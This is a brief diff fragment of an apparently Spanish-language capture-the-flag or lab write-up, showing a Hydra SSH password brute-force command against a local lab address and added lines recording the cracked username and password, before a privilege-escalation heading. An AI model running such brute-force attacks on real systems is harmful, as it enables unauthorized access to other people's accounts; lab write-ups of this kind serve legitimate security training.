@@ -78,5 +78,7 @@ hydra -l tails -P /usr/share/wordlists/rockyouinvertido.txt ssh://172.17.0.2
 ```
 
 
-
+Datos obtenidos:
+Usuario: tails
+Password: 3117548331
 # Escalada de privilegios
